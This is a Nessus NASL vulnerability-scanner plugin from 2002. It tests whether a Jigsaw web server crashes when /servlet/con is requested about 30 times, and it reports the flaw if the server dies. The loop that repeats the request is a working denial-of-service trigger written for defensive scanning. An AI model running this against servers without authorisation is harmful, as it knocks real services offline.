#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL...
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# From: "Peter_Gründl" <pgrundl@kpmg.dk>
# To: "vulnwatch" <vulnwatch@vulnwatch.org>
# Date: Wed, 17 Jul 2002 11:36:33 +0200
# Subject: [VulnWatch] KPMG-2002034: Jigsaw Webserver DOS device DoS
#

if(description)
{
 script_id(11047);
 script_bugtraq_id(5251, 5258);
 script_version("$Revision: 1.12 $");
 script_cve_id("CVE-2002-1052");
 name["english"] = "Jigsaw webserver MS/DOS device DoS";
 name["francais"] = "Déni de service 'dev MS/DOS' contre Jigsaw";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the Jigsaw web 
server by requesting /servlet/con about 30 times.

A cracker may use this attack to make this
service crash continuously.


Solution: upgrade your software

Risk factor : High";


 desc["francais"] = "Il a été possible de tuer le serveur web 
Jigsaw en accédant une trentaine à /servlet/con

Un pirate peut exploiter cette faille pour tuer
continuellement ce service.


Solution: mettez à jour votre logiciel

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Jigsaw DOS dev DoS";
 summary["francais"] = "Déni de service DOS contre Jigsaw";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 #family["english"] = "Untested";
 #family["francais"] = "Untested";

 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");



port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);


soc = http_open_socket(port);
if (!soc) exit(0);


req = http_get(item:"/servlet/con", port: port);

for (i=0; i<32;i=i+1)
{
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 soc = http_open_socket(port);
 if (! soc)
 {
   security_hole(port);
   exit(0);
 }
}

close(soc);

if(http_is_dead(port:port))security_hole(port);


